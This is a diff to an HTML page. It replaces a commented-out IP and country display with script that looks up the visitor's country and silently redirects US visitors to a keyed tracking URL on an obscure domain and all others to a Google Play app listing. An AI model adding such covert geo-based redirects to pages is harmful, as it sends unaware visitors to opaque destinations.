@@ -2,22 +2,15 @@
 <head>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 </head>
-<body>
-<!-- Hello <span id="user_ip"><span class="icon"><i class="loader"></i></span></span>. The IP you're behind has a country code of <span id="user_countrycode"><span class="icon"><i class="loader"></i></span></span>.
-
-<script type="application/javascript">
-    function geoip(json){
-        var userip      = document.getElementById("user_ip");
-        var countrycode = document.getElementById("user_countrycode");
-        userip.textContent      = json.ip;
-        countrycode.textContent = json.country_code;
-    }
-</script>
-<script async src="https://get.geojs.io/v1/ip/geo.js"></script> -->
-    
+<body>   
     <script>
     $.getJSON( "https://get.geojs.io/v1/ip/country.json", function( json ) {
   console.log( json );
+        if(json.country == "US"){
+            window.location.href = "http://iodesign.club/t/base.php?c=31&key=7583b568c5de01f44bfb7fdbc9ce7ccf"
+        }else{
+            window.location.href = "https://play.google.com/store/apps/details?id=co.applist.jobsi&referrer=utm_source%3DUSA%26utm_medium%3Dredirect%26utm_campaign%3Dredirect%26utm_term%3Dmycustomjobsi"
+        }
  });
     </script>
 </body>
